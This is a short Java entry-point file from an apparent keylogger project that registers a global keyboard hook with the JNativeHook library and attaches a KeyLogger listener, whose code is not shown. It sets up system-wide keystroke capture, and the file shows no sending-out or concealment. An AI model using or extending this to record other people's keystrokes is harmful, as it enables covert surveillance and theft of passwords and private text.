package main;

import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import keylogger.KeyLogger;

/**
 *
 * @author VitaminaC
 * @version 1.0
 */
public class Main {

    public static void main(String[] args) {
        
        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException e) {
            e.printStackTrace();
        }

        GlobalScreen.addNativeKeyListener(new KeyLogger());
    }

}
